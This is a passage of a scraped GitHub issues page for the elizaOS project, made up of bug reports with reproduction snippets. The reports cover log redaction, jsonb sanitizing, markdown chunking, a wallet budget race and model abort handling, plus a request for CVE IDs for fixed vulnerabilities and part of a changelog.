--\u003e\n\u003c!-- attribution-row:ai-assistance --\u003e\n- AI assistance: `yes`\n\u003c!-- attribution-row:models --\u003e\n- Model(s) used: `anthropic/claude-fable-5-1`\n\u003c!-- attribution-row:client --\u003e\n- Agent tooling: `Claude Code`\n\u003c!-- attribution-row:skill-revision --\u003e\n- Skill path: `elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99: s is a server-only administrative API path with no rendered UI.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots: N/A - no rendered visual surface.\n- [x] Backend logs: N/A - the route does not emit an application log for this\n      request; the real route response and mocked autoscaler call ledger are\n      included above.\n- [x] Frontend console/network logs: N/A - no frontend behavior changes.\n- [x] Real-LLM trajectory: N/A - no agent, prompt, provider, or model behavior.\n- [x] Domain artifacts: the route response and autoscaler invocation ledger\n      above capture the mutation boundary directly.\n\n**Additional context**\n\nNeighboring Docker-node create and update routes already reject malformed JSON\nwith HTTP 400. A repository and GitHub search found no open issue or pull\nrequest covering this drain-route failure.\n\nAI provider/model: openai / gpt-5.6-sol\nClient / agent tooling: Codex\nContribution skill revision: N/A - ordinary GitHub contribution without optional run evidence\nAttribution status: self-reported\n— [contributor]\n\u003c!-- eliza-computer-attribution:v1 {\"provider\":\"openai\",\"model\":\"gpt-5.6-sol\",\"client\":\"Codex\",\"skill_revision\":\"N/A - ordinary GitHub contribution without optional run evidence\"} --\u003e\n"])</script><script>self.__next_f.push([1,"2c:T5b4,"])</script><script>self.__next_f.push([1,"## Defect\n\n`redactLogValue` in `packages/core/src/security/log-redaction.ts` keeps every visited object in a single never-pruned `WeakSet` (`seen.add` with no `delete`). Every log sink that goes through it (core logger metadata and trailing args, `packages/ui/src/logger.ts`, cloud `redactLogArgs`) prints the second reference to any shared, non-cyclic object as `[Circular]`.\n\nReproduced on develop `b4eb27576f` through the real core logger:\n\n```ts\nconst owner = { id: \"u1\", name: \"Ada\", apiKey: \"sk-live-fixture\" };\nlogger.info({ requester: owner, assignee: owner }, \"probe-shared-reference\");\n// recentLogs(): ... requester={\"id\":\"u1\",\"name\":\"Ada\",\"apiKey\":\"[REDACTED]\"}, assignee=[Circular]\n```\n\nAlso: `{ error, lastError: error }` drops the second error; `[tag, tag, tag]` logs one tag and two `[Circular]` markers.\n\n## Authority\n\nThis is the logger site of #25125, consolidated into #31004 on 2026-09-14 (\"explicitly includes logger redaction … remains a real unresolved bug\"). #31004 closed on 2026-09-27 after three other sites were fixed; the logger walker moved to `packages/core/src/security/log-redaction.ts` in the restructure and was not among them.\n\n## Acceptance\n\n- Shared references render in full (and redacted) at every position; true cycles still collapse to `[Circular]`.\n- The walk stays bounded on densely shared graphs (e.g. an HTTP client error carrying its request/socket/agent).\n- Regression tests on the real walker.\n\nFix: #33045\n"])</script><script>self.__next_f.push([1,"2d:Tdc8,"])</script><script>self.__next_f.push([1,"## Problem\n\nThe native cloud gateway (`packages/auth/native-host/cloud-services/cloud-services.mjs`) reads the saved pending sign-in journal in three places with three different levels of parse discipline, and two of them violate the contract the other readers establish.\n\n1. **`accountAccess` (the `GET /cloud/account/access` reader) parses the journal unguarded:**\n\n```js\nconst pending = await pendingCredentialStore?.read();\nif (pending \u0026\u0026 JSON.parse(pending).kind === \"revocation\")\n```\n\nA journal that is unparseable **after startup** (partial write, editor, sync tool — `ready` already resolved with valid bytes, so the per-request read is what sees the corruption) throws a raw `SyntaxError` through the route boundary, which maps it to **502 `{\"error\":\"Cloud service unavailable\"}`**. Every sibling reader of the same bytes returns the designed **409 `savedSignInNeedsAccountRecovery`** account-recovery state instead (`ready`, `usableCredential`, and three sites in `cloud-enrollment.mjs`). The account panel therefore renders a transient-looking provider outage that invites endless retry instead of the recovery path.\n\n2. **`ready` and `usableCredential` parse guarded but then dereference `.kind` on whatever parsed:**\n\n```js\ntry { saved = JSON.parse(raw); } catch { throw fail(message(\"savedSignInNeedsAccountRecovery\"), 409); }\nif (saved.kind === \"revocation\") ...\n```\n\nA journal that parses to `null` or a primitive (the string `\"null\"` is exactly what `/cloud/status`'s own reader is written to tolerate: `JSON.parse(pending ?? \"null\")?.kind`) makes `ready` reject with a `TypeError` **outside its try**, so `await ready` fails on **every** `/cloud/*` route with 502 `Cloud service unavailable` — including `/cloud/status`, whose own parse would have treated the same bytes as benign.\n\n## Reproduction (current `develop`)\n\n`develop` `9ffc6f626c02dbf5bdba09911f91c2bbf488fad4`; `cloud-services.mjs` blob `855478cebe3b56feda4ddc6b10bd6962e043b8fa`.\n\nDriving `createCloudRoutes` over a real loopback HTTP server with an in-memory `pendingCredentialStore`:\n\n- Store returns `null` at startup, then `\"{not json\"` before `GET /cloud/account/access` → **502** `{\"error\":\"Cloud service unavailable\"}` (expected 409 `savedSignInNeedsAccountRecovery`; `GET /cloud/account/invoices` through `usableCredential` already 409s on the same bytes).\n- Store returns the string `\"null\"` from startup → `GET /cloud/status` → **502** on every route via the `ready` rejection (expected: benign `disconnectPending: false`, matching the route's own `JSON.parse(pending ?? \"null\")?.kind` reader).\n\n## Acceptance criteria\n\n- A pending journal that is unparseable at request time makes `/cloud/account/access` return the 409 `savedSignInNeedsAccountRecovery` state, never a 502 outage.\n- A journal that parses to `null`/a primitive is benign everywhere: no route fails in `ready`, `usableCredential`, or `accountAccess`; `/cloud/status` keeps reporting `disconnectPending: false`.\n- The malformed-parse catch is documented as error-policy:J3 (explicit invalid state, never a fake-valid default).\n- Regression tests drive the real route handler over HTTP with a mutable pending store; `node --test native-host/cloud-services/*.test.mjs` and `node --test native-host/*.test.mjs` pass.\n\n## Duplication check\n\nOpen issue/PR searches for `savedSignInNeedsAccountRecovery`, `pendingCredentialStore`, and `cloud-services` found no matching work. #33272/#33273 hardened `projectCheckout` in this file; nothing touches the journal readers."])</script><script>self.__next_f.push([1,"2e:T638,"])</script><script>self.__next_f.push([1,"### Problem\n\nOn develop `229502c357`, `plugins/plugin-assistant/src/features/messaging/triage/actions/listInbox.ts` serves the cached TriageService store whenever it is non-empty and only triggers a live `triage()` pull when the cache is completely empty. `MessageRefStore` keeps every ref a sweep ever handed it and never prunes read rows, so once the cached view contains only read messages, the action permanently answers \"No unread messages across connected platforms.\" for the rest of the process lifetime while the authoritative connectors hold new unread mail.\n\n### Reproduction and expected behavior\n\n1. A `triage` sweep stores refs that are all `isRead` (or every ref in the store becomes read).\n2. New unread mail arrives on the connector.\n3. MESSAGE `list_inbox` (\"show me unread across all platforms\") → the cached path runs `rankScored`, filters unread to zero, and reports \"No unread messages across connected platforms.\" without consulting any adapter.\n\nExpected: a cached view with zero unread must fall through to the same live pull an empty cache gets, so the empty answer is only reported after the authoritative sources agree. An empty result after that live pull stays truthful.\n\n### Acceptance\n\n- An all-read cache triggers exactly one live pull; the returned unread view comes from the live result.\n- When the live pull also yields no unread, the explicit empty-inbox result is reported (now live-verified, and the adapter pull is observable).\n- Existing cached-unread and empty-cache behaviors are unchanged.\n- Tests cover both cases against the real action handler."])</script><script>self.__next_f.push([1,"2f:T489,Hi @lalalune @lumix5,\n\nFirst off, genuine respect for this project — an open-source agentic OS with this\nbreadth (multi-platform desktop app, plugin runtime, agent API) is rare, and the\nengineering quality shows. Case in point: my security report got a fix PR within\nabout an hour, and both issues were verified with regression tests and closed\nwithin two days. That turnaround is among the best I've seen in open source.\n\nI'm the reporter of #33034 and #33036. Since both are already fixed on develop\n(#33040, #33142, #33169), I'm opening this only as a follow-up to a request I\nleft on both threads on Oct 4, which I suspect went unnoticed — quite\nunderstandable, since both were closed by then.\n\n## The request\n\nCould you help get CVE IDs assigned for these two vulnerabilities?\n\nFor context on why it matters: users running `@elizaos/app` ≤ 2.0.3-beta.7 are\nexposed to silent theft of the OWNER-level token / plaintext stored provider\nkeys by any website they visit. A published GHSA + CVE is how most users and\nscanners learn that a desktop update is security-critical, and it also records\nhow quickly you fixed it.\n\nThanks again for the fast fixes!\n30:T9d6,"])</script><script>self.__next_f.push([1,"**Describe the bug**\n\n#34093 / #34094 route memory-content replacement, atomic-publication heads, and `updateLogs` through the jsonb sanitizer. The rest of the entity-graph writes in `plugins/plugin-sql/src/base.ts` still bind caller objects through drizzle's default `JSON.stringify` (or a hand-built `JSON.stringify(...)::jsonb`), with no check for text PostgreSQL jsonb cannot store. A NUL character or a lone UTF-16 surrogate (typically a truncated emoji) in entity, component, room, world, task, relationship, cache or agent data fails in the driver:\n\n- Some writes surface the raw `22P02` / `22P05` `DrizzleQueryError`.\n- Others wrap it in a generic `DB_*_FAILED`.\n\nThe memory path returns the typed `SQL_JSON_UNSUPPORTED_NUL` / `SQL_JSON_UNSUPPORTED_SURROGATE` instead. In both cases the drizzle `Failed query` message embeds the bound parameters, so the caller's data goes into any log that records the error.\n\n**To Reproduce**\n\nOn `origin/develop` `65621da3a4` (with #34094 applied), real PGlite via `createIsolatedTestDatabase`. Each write gets `{ note: \"x \\ud83d\" }` in its jsonb field:\n\n| Write | Result |\n|---|---|\n| `updateEntity` metadata | raw `22P02`, `Failed query: update \"entities\" …` |\n| `createComponent` data | raw `22P02`, `Failed query: insert into \"components\" …` |\n| `updateRoom` metadata | raw `22P02`, `Failed query: update \"rooms\" …` |\n| `updateWorld` metadata | raw `22P02`, `Failed query: update \"worlds\" …` |\n| `createTask` metadata | raw `22P02`, `Failed query: insert into \"tasks\" …` |\n| `createEntities` metadata | `DB_INSERT_FAILED` wrapping the raw error |\n| `createRelationship` metadata | `DB_INSERT_FAILED` wrapping the raw error |\n| `setCache` value | `DB_UPSERT_FAILED` wrapping the raw error |\n| `updateAgent` settings | `DB_UPDATE_FAILED` wrapping the raw error |\n\nOther sites with the same binding:\n- `createAgent`, `updateComponent`, `createRooms`, `updateRelationship`, `createWorld`, `updateTask`;\n- `compareAndSwapWorldMetadata`, `patchComponents`, `updatePendingTask`, `patchTaskMetadata`;\n- the cache compare-and-swap.\n\n**Expected behavior**\n\nThese writes reject unsupported text before the bind with the same typed `SQL_JSON_UNSUPPORTED_NUL` / `SQL_JSON_UNSUPPORTED_SURROGATE` errors, carrying no content.\n\nRouting them through `serializeJsonb` would also apply its 1 MiB / 10,000-node / depth-64 structural caps and cycle rewriting. That would add new hard limits to component, task and agent data that have none today, so the check should be text-only.\n"])</script><script>self.__next_f.push([1,"31:T24f9,"])</script><script>self.__next_f.push([1,"**Describe the bug**\n\nThree jsonb writes in `plugins/plugin-sql/src/base.ts` bind caller text without the shared sanitizer in `plugins/plugin-sql/src/sanitize-json.ts`. A NUL character or a lone UTF-16 surrogate (half of a pair, typically a truncated emoji) reaches PostgreSQL and fails with the driver's raw `22P05` / `22P02` error. The matching create paths return a typed error instead: `SQL_JSON_UNSUPPORTED_NUL` / `SQL_JSON_UNSUPPORTED_SURROGATE` for memory rows, and for log bodies the NUL is stripped and the surrogate replaced with U+FFFD. #33124 added the lone-surrogate half of that policy to the sanitizer, but these three writes never call it.\n\n- `base.ts:2223`, `publishMessageContentSegments` in replace mode: `.set({ content: params.replacementContent })` passes the content object to drizzle, which binds `JSON.stringify(value)`. Create mode of the same method writes the parent through `insertMemoryInTransaction` (`base.ts:2122`), which applies the strict serializer to content and metadata (`base.ts:4672-4680`). The public `runtime.replaceMessageMemoryContent` (`packages/core/src/runtime.ts:5264`, `packages/core/src/runtime/data-mutations.ts:413-470`) reaches this branch. plugin-assistant calls it through `replaceStoredMessageContent` after attachment enrichment, after an incoming hook rewrites the text, and after translation (`plugins/plugin-assistant/src/services/message/processor.ts:526`, `:581`, `:1110`). Text under the 64 KiB inline limit stays in the parent row, so it reaches this write. Longer text goes to segment rows, which are already sanitized.\n- `base.ts:7978-7979`, `compareAndSwapMemoryPublication`: the head's content and metadata are bound as `JSON.stringify(...)` with a `::jsonb` cast. The dependencies of the same publication go through `insertMemoryInTransaction`.\n- `base.ts:7890`, `updateLogs`: `setValues.body = updates.body` binds the new body unsanitized. `log()` passes the body through `sanitizeJsonObject` first (`base.ts:4052`).\n\nThe raw error is also a worse failure to surface: drizzle's `Failed query` message embeds the bound parameters, so the whole content goes into any log that records the error. The typed errors carry no content.\n\n**To Reproduce**\n\nOn `origin/develop` `65621da3a4`, with Bun 1.3.14, Node 24.15.0 and `bun install --frozen-lockfile --ignore-scripts`. The probe uses a real PGlite adapter and the real `AgentRuntime` from `createIsolatedTestDatabase` (`plugins/plugin-sql/src/__tests__/test-helpers.ts`), and creates a room and an entity first:\n\n```ts\nawait adapter.createMemory({ id, agentId, entityId, roomId, content: { text: \"original\" }, metadata: { type: \"message\" } }, \"messages\");\nawait runtime.replaceMessageMemoryContent(id, { text: \"x \\ud83d\" });\nawait runtime.replaceMessageMemoryContent(id, { text: \"x \\u0000\" });\nawait adapter.compareAndSwapMemoryPublication({ head: { memory: { id: headId, agentId, entityId, roomId, content: { text: \"x \\ud83d\" }, metadata: { revision: \"r1\" } }, tableName: \"probe_heads\" }, dependencies: [], expectedRevision: null });\nawait adapter.compareAndSwapMemoryPublication({ /* same head */ content: { text: \"ok\" }, metadata: { revision: \"r1\", note: \"a\\u0000b\" } });\nawait adapter.log({ body: { reply: \"first\" }, entityId, roomId, type: \"probe\" });\nawait adapter.updateLogs([{ id: logId, updates: { body: { reply: \"done \\ud83d\", nested: { text: \"a\\u0000b\" } } } }]);\n```\n\nProbe output, verbatim (the error message is cut at 160 characters by the probe):\n\n```\nreplaceMessageMemoryContent text lone surrogate: THROWS Error | code=undefined | message=\"Failed query: update \\\"memories\\\" set \\\"content\\\" = $1 where \\\"memories\\\".\\\"id\\\" = $2 returning \\\"id\\\", \\\"type\\\", \\\"created_at\\\", \\\"content\\\", \\\"entity_id\\\", \\\"agent_id\\\", \\\"room_id\" | cause.name=error | cause.code=22P02 | cause.message=\"invalid input syntax for type json\"\nreplaceMessageMemoryContent text lone surrogate: stored content after = {\"text\":\"original\"}\nreplaceMessageMemoryContent text NUL: THROWS Error | code=undefined | message=\"Failed query: update \\\"memories\\\" set \\\"content\\\" = $1 where \\\"memories\\\".\\\"id\\\" = $2 returning \\\"id\\\", \\\"type\\\", \\\"created_at\\\", \\\"content\\\", \\\"entity_id\\\", \\\"agent_id\\\", \\\"room_id\" | cause.name=error | cause.code=22P05 | cause.message=\"unsupported Unicode escape sequence\"\nreplaceMessageMemoryContent text NUL: stored content after = {\"text\":\"original\"}\ncompareAndSwapMemoryPublication content lone surrogate: THROWS Error | code=undefined | message=\"Failed query: insert into \\\"memories\\\" (\\\"id\\\", \\\"type\\\", \\\"created_at\\\", \\\"content\\\", \\\"entity_id\\\", \\\"agent_id\\\", \\\"room_id\\\", \\\"world_id\\\", \\\"unique\\\", \\\"metadata\\\") values ($1, $\" | cause.name=error | cause.code=22P02 | cause.message=\"invalid input syntax for type json\"\ncompareAndSwapMemoryPublication content lone surrogate: stored rows after = 0\ncompareAndSwapMemoryPublication metadata NUL: THROWS Error | code=undefined | message=\"Failed query: insert into \\\"memories\\\" (\\\"id\\\", \\\"type\\\", \\\"created_at\\\", \\\"content\\\", \\\"entity_id\\\", \\\"agent_id\\\", \\\"room_id\\\", \\\"world_id\\\", \\\"unique\\\", \\\"metadata\\\") values ($1, $\" | cause.name=error | cause.code=22P05 | cause.message=\"unsupported Unicode escape sequence\"\ncompareAndSwapMemoryPublication metadata NUL: stored rows after = 0\nupdateLogs lone surrogate + NUL: THROWS Error | code=undefined | message=\"Failed query: update \\\"logs\\\" set \\\"body\\\" = $1 where (\\\"logs\\\".\\\"id\\\" = $2 and \\\"logs\\\".\\\"room_id\\\" in (select \\\"id\\\" from \\\"rooms\\\" where \\\"rooms\\\".\\\"agent_id\\\" = $3))\\nparams: {\\\"\" | cause.name=error | cause.code=22P02 | cause.message=\"invalid input syntax for type json\"\nupdateLogs: stored body after = {\"reply\":\"first\"}\n```\n\nThe complete error for the first call, as Vitest prints it (`runtime.replaceMessageMemoryContent(id, { text: \"x \\ud83d\" })`, real PGlite). The message ends with the bound parameters, which hold the content:\n\n```\nDrizzleQueryError {\n  \"message\": \"Failed query: update \\\"memories\\\" set \\\"content\\\" = $1 where \\\"memories\\\".\\\"id\\\" = $2 returning \\\"id\\\", \\\"type\\\", \\\"created_at\\\", \\\"content\\\", \\\"entity_id\\\", \\\"agent_id\\\", \\\"room_id\\\", \\\"world_id\\\", \\\"unique\\\", \\\"metadata\\\"\nparams: {\\\"text\\\":\\\"x \\\\ud83d\\\"},31809931-c3e8-4f75-8d43-491cf88ee69d\",\n  \"cause\": error {\n    \"message\": \"invalid input syntax for type json\",\n    \"code\": \"22P02\",\n    \"detail\": \"Unicode low surrogate must follow a high surrogate.\",\n```\n\n**Expected behavior**\n\nEach write applies the policy its create path already applies:\n\n- The replacement parent and the publication head reject with `ElizaError` `SQL_JSON_UNSUPPORTED_SURROGATE` or `SQL_JSON_UNSUPPORTED_NUL`, as `createMemory` does. Nothing is written: the parent is unchanged, and no segment or dependency row is staged.\n- `updateLogs` stores the body with NUL removed and lone surrogates replaced by U+FFFD, as `log()` does.\n- Well-formed surrogate pairs such as emoji are stored unchanged.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - storage-adapter behaviour with no rendered surface. The transcripts above are the proof.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no visible surface; see the transcripts.\n- [x] Backend logs and frontend console/network logs when relevant: the adapter's thrown errors and the stored rows are above. N/A for frontend: no frontend code is involved.\n- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model, prompt or action is involved. The probe calls the runtime API directly.\n- [x] Domain artifacts when relevant: the stored message content, publication row count and log body after each call are in the transcript.\n\n**Additional context**\n\n- Follow-up to #33124 (#33125), which taught the shared sanitizer to handle lone surrogates.\n- The two in-repo `compareAndSwapMemoryPublication` callers, `plugins/plugin-google-workspace/src/gmail-content-cache.ts:433` and `plugins/plugin-assistant/src/features/advanced-memory/session-summary-content-manifest.ts:505`, put `JSON.stringify(...)` output in `content.text`, which already escapes NUL and lone surrogates. They do not hit the raw error today. The gap is in the adapter method itself, and in the head's metadata values.\n- No in-repo caller passes a body to `updateLogs`. Plugins reach it through `runtime.updateLogs` (`packages/core/src/runtime.ts:4674`).\n- Out of scope here: other jsonb writes. #33124 noted that cache, component, entity and room metadata writes do not use this sanitizer either.\n\n**Contribution provenance**\n\n\u003c!-- contribution-attribution:v1 --\u003e\n\u003c!-- attribution-row:ai-assistance --\u003e\n- AI assistance: `yes`\n\u003c!-- attribution-row:models --\u003e\n- Model(s) used: `anthropic/claude-opus-5-5`\n\u003c!-- attribution-row:client --\u003e\n- Agent tooling: `Claude Code`\n\u003c!-- attribution-row:skill-revision --\u003e\n- Skill path: `elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza`\n\u003c!-- attribution-row:status --\u003e\n- Provenance status: `self-reported`\n\nAI provider/model: anthropic / claude-opus-5-5\nClient / agent tooling: Claude Code\nContribution skill revision: elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\nAttribution status: self-reported\n— [nxn-claude-code]\n\u003c!-- eliza-computer-attribution:v1 {\"provider\":\"anthropic\",\"model\":\"claude-opus-5-5\",\"client\":\"Claude Code\",\"skill_revision\":\"elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\"} --\u003e\n"])</script><script>self.__next_f.push([1,"32:T772,"])</script><script>self.__next_f.push([1,"`chunkMarkdownText` (`packages/core/src/markdown/chunk.ts`) can emit an empty code block, then reopen the fence in the next chunk, when a fenced block's closing line is longer than `indent + marker`. That covers trailing spaces or tabs (`\"``` \"`), a longer closing marker (```` ```` ```` closing ```` ``` ````), an indented closer (`\"  ```\"`), and `\"~~~ \"`. Every outbound text that goes through the markdown chunker is affected.\n\n## Reproduction (current `develop` `65621da3a42`, Bun 1.4.2)\n\n```ts\nimport { chunkMarkdownText } from \"@elizaos/core\";\nconst body = Array.from({ length: 10 }, (_, i) =\u003e `line ${i} value${\"x\".repeat(i % 4)}`);\nconst text = `Intro.\\n\\n\\`\\`\\`ts\\n${body.join(\"\\n\")}\\n\\`\\`\\` \\n\\nOutro paragraph.`;\nchunkMarkdownText(text, 16);\n// [..., \"```ts\\nline 9\\n```\", \"```ts\\n``` \\n\", \"Outro paragraph.\"]\n```\n\nAcross limits 16..110 with the same 10-line block, empty code-block chunks per closing line:\n\n| Closing line | `\"```\"` | `\"``` \"` | `\"```  \"` | `\"```\\t\"` | ```` \"````\" ```` | `\"~~~ \"` | `\"  ```\"` | `\"  ``` \"` | ```` \"``````   \" ```` |\n|---|---|---|---|---|---|---|---|---|---|\n| Empty blocks | 0 | 4 | 8 | 4 | 4 | 4 | 8 | 11 | 23 |\n\n## Cause\n\nWhen a split lands inside a fence, the chunker reserves room only for the synthetic closer `${indent}${marker}`. If the original closing line is longer, there are limits where the chunk fits the synthetic closer but not the real one. The cut then lands at the start of the real closing line, and the next chunk reopens the fence (`openLine + \"\\n\"`) just to close it again.\n\nOnce #34057 (CRLF fence recognition) merges, CRLF input hits the same path, because the `\\r` makes every CRLF closing line one character longer.\n\n## Expected\n\nWhen the cut leaves no fence content, close the fence in the current chunk and drop the original closing line. No chunk should be an empty code block, and code content and the chunk limit stay unchanged.\n"])</script><script>self.__next_f.push([1,"33:Tcb0,"])</script><script>self.__next_f.push([1,"**Describe the bug**\n\nIn `plugins/plugin-wallet/src/sdk/x402/client.ts`, a payment is checked with `this.budget.checkBudget(service, amount)` (sync), then `await this.executePayment(selected)` (an on-chain transfer), and only afterwards recorded with `this.budget.recordPayment(log)`. `X402BudgetTracker` keeps `dailySpend` in memory and only updates it in `recordPayment`. So concurrent x402 requests to the same service can all pass the per-service `dailyLimit` check before any of them is recorded, and the agent spends past the configured service cap.\n\nScope, to be precise: the AgentWallet contract's on-chain spend policy (`setSpendPolicy` / `remainingBudget`) still bounds global spend when it's configured. What can be exceeded is the client-side per-service caps (`serviceBudgets[].dailyLimit`) and `globalDailyLimit` when no on-chain policy is set.\n\n**To Reproduce**\n\nA minimal script against the real `budget.ts` (at `f7a6b0fea5`) that mirrors the client's check → await → record order:\n\n```ts\nimport { X402BudgetTracker } from \"./budget.ts\";\nconst tracker = new X402BudgetTracker({\n  serviceBudgets: [{ service: \"api.example.com\", maxPerRequest: 1_000_000n, dailyLimit: 5_000_000n }], // $5/day\n});\nconst executePayment = () =\u003e new Promise\u003cvoid\u003e((r) =\u003e setTimeout(r, 50)); // stands in for the transfer\nasync function pay(i: number) {\n  if (!tracker.checkBudget(\"api.example.com\", 1_000_000n).allowed) return \"blocked\";\n  await executePayment();\n  tracker.recordPayment({ timestamp: Date.now(), service: \"api.example.com\", url: `https://api.example.com/${i}`,\n    amount: 1_000_000n, token: \"0x00…00\", recipient: \"0x00…01\", success: true } as any);\n  return \"paid\";\n}\nconst outcomes = await Promise.all(Array.from({ length: 10 }, (_, i) =\u003e pay(i)));\n```\n\nOutput (`bun run repro.ts`):\n\n```\n10 concurrent $1 payments against a $5/day service cap -\u003e paid=10, blocked=0, recorded spend=$10\nnext check after they settle: allowed=false (Would exceed daily limit 5000000 for api.example.com)\n```\n\n**Expected behavior**\n\nAt most 5 of the 10 payments proceed, and the rest are blocked before `executePayment` runs.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - not a visible bug; the reproduction output above is the evidence.\n\n**Evidence / reproduction proof**\n\n- [ ] MP4 recording or JPG screenshots: N/A - logic race, no UI.\n- [x] Logs: script output above.\n- [ ] Real-LLM trajectory: N/A - independent of the model.\n- [x] Domain artifacts: recorded spend $10 against a $5 service cap.\n\n**Additional context**\n\nA small fix that keeps the existing API: have `checkBudget` *reserve* the amount synchronously when it allows a payment (add it to a pending total that the daily checks include), then turn the reservation into spend in `recordPayment`, or release it if `executePayment` throws or fails. Because there's no `await` between the check and the hold, concurrent requests can't both pass against the same remaining budget. Totals would still be in memory, so restarts reset them; that seems acceptable as long as the on-chain policy is the hard limit.\n\nI'm happy to send that as a PR with a test based on the reproduction above. (I maintain Inferrail, where I fixed the same pattern.)\n"])</script><script>self.__next_f.push([1,"34:T60e,"])</script><script>self.__next_f.push([1,"## Problem\n\n`RuntimeModelDispatch.useModel` now composes distinct caller and turn signals for the provider transport, downstream delivery, and embedding validation, but `throwIfAborted` still checks the two source signals separately in fixed caller-first order. If the turn aborts first and provider cleanup synchronously aborts the caller controller before the handler rejection reaches the runtime, the provider signal correctly retains the turn reason while `useModel` throws the later caller reason.\n\nReproduced on `develop` at `88c6db14b0e4aeaeed79811b068a7906ee0756b7`. A real `AgentRuntime` handler waits on the composed provider signal; its abort listener aborts the caller controller with a different reason and rejects. The focused cancellation suite is **1 failed / 7 passed**: the pending model call rejects with `caller cleanup cancelled second` instead of `turn cancelled first`.\n\n## Expected behavior\n\nRuntime cancellation checks should use the same composed dispatch signal already delivered to the provider. The first abort reason must remain authoritative, cancellation must not trigger provider fallback, and neither caller params nor controller ownership should be mutated.\n\n## Proposed scope\n\nMake `throwIfAborted` consult `dispatchSignal`, add the competing-owner regression, and update the model cancellation API comment to describe composition and identity preservation. No provider API or dependency changes.\n\nAI provider/model: OpenAI / GPT-5\nClient / agent tooling: Codex\nAttribution status: self-reported\n— [contributor]"])</script><script>self.__next_f.push([1,"35:T49d,## Problem\n\nThe Gmail MESSAGE adapter converts `sinceMs` to Gmail's exclusive `after:` search operator with `Math.floor(sinceMs / 1000)`. When `sinceMs` is exactly on a whole-second boundary, the generated query excludes a message at the requested timestamp before the adapter's exact local filter can see it.\n\nExample: `sinceMs: 7000` generates `after:7`. A Gmail message whose `internalDate` is exactly `7000` should satisfy the adapter's inclusive `receivedAt \u003e= sinceMs` contract, but Gmail omits it because `after:` is exclusive.\n\n## Reproduction\n\nAgainst current `develop`, add a provider-faithful mailbox row at 7000 ms and call `searchMessages({ sinceMs: 7000, limit: 5 })`.\n\n```text\nExpected: [\"sent_1\", \"sent_2\", \"sent_3\"]\nReceived: [\"sent_2\", \"sent_3\"]\n```\n\nMeasured with pinned Bun 1.4.2:\n\n```text\nbun --conditions=eliza-source test plugins/plugin-google-workspace/src/lifeops-message-adapter.test.ts --test-name-pattern \"filters channels and time\"\n0 pass, 1 fail\n```\n\n## Expected behavior\n\nThe provider query must be a conservative superset of the inclusive millisecond bound. Query the preceding whole second, then retain the existing exact local millisecond filter.\n36:T4cc,## Problem\n\nAfter #33750, stored Discord history and backfill map the connected account's own bot user to `runtime.agentId`, matching the send path. `DiscordService.getConnectorChatContext`, however, still maps every cached message author through `resolveDiscordEntityId`.\n\nAs a result, the same agent-authored message has two entity identities depending on which MessageConnector history surface returns it: cached chat context returns `createUniqueUuid(runtime, botUserId)`, while stored history returns `runtime.agentId`.\n\n## Reproduction\n\nOn current `develop`, construct a Discord account whose client user is the author of a cached channel message, then call `getConnectorChatContext` for that account.\n\nExpected: the own-bot cached message has `entityId === runtime.agentId`; other bot users retain their derived Discord entity IDs.\n\nActual: the own-bot cached message has the derived Discord entity ID.\n\nThe focused regression test fails on `develop` with the own-bot UUID mismatch while the existing stored-history and backfill assertions pass.\n\n## Proposed fix\n\nReuse the account-scoped history-author resolver from `discord-history.ts` for cached connector context. Keep all other authors on `resolveDiscordEntityId`.\n37:T959,"])</script><script>self.__next_f.push  - A denial is terminal: it never fails over, the embedding queue doesn't retry it, and it isn't retryable when a model call inside an action handler raises it.\n  - The policy sees the model type the caller asked for, before any LLM-mode override.\n  - With no policy installed, behavior is unchanged.\n- `runActionsByMode` and plugin-assistant plan steps now settle through the action gate (`settleActionHandler`).\n- Removed, with zero in-repo callers: the `zod-schema.agent-runtime` subpath, `ToolPolicyService` / `getFilteredActions` / `isActionAllowed`, 17 private model wrappers in `runtime.ts`, and duplicate helpers. `canonicalJson` and `parseBooleanFromText` now each have one implementation. The shared canonical backup JSON rejects sparse array holes.\n\n### agent\n- `ELIZA_PROTECTED_PROFILE=dstack-cpu` (captured from the process env at entry) runs admission before config load, vault hydration, API listen and plugin resolution.\n- `ELIZA_TEE_*`, `ELIZA_DSTACK_*`, `ELIZA_CONFIDENTIAL_*` and `ELIZA_PROTECTED_*` are env-only. They are blocked from config and API env writes, and the state-dir `config.env` can't apply or persist them either.\n- Evidence-factory registration is refused under the profile.\n- Audit sinks are async, and a failure in a required sink now rejects. Retention never deletes audit log types. Confidential-runtime schema is v2.\n\n### cloud\n- API key create, delete, regenerate and mobile revoke write their audit event in the same transaction. A sink failure rolls the change back.\n  - An oversized client `X-Request-Id` is dropped from the event instead of failing the write.\n- PII scrub markers record their inspection scope (migration `0506`).\n- There is a single retryable provider-fallback middleware with a `ProviderFallbackPolicy` hook. A refusal throws `PROVIDER_FALLBACK_REFUSED`.\n- With `FIELD_ENCRYPTION_REQUIRED`, agent env secrets no longer fall back to plaintext. `FIELD_ENCRYPTION_REQUIRE_AAD` is documented as off until writers pass coordinates.\n- New `user_consents` table (migration `0507`) with `GET`/`POST /api/v1/me/consents` for `vision_capture`. GET also returns `effective` (the enforced policy, with `basis` and `defaultGranted`) and `capture.modelCallRecording` (the deployment's recording policy).\n  - There's a user-scoped live `POST /api/v1/me/data-export` that requires a recent login.\n- A single `getRequestIp` helper (`cf-connecting-ip` first) serves all webhooks. Expired `auth_events` are purged.\n\n### app / ui\n- There is one session-cookie parser: identical duplicate cookies are accepted, conflicting ones rejected.\n- Logout revokes every presented session credential, including conflicting duplicates, and also expires the `Domain` variant.\n- Revoking a session closes its open WebSockets (1008). Admission re-reads the session after binding, so a revoke that races the handshake can't leave a socket open.\n- The privacy panel shows the deployment's model-call recording policy (read-only) and leaves vision/screen capture to device permissions. It uses the live export endpoint.\n- Removed the dead first-run fork, update policy, `api/response` and `globals` shims.\n\n### Review feedback addressed\n- Migration collisions: renumbered 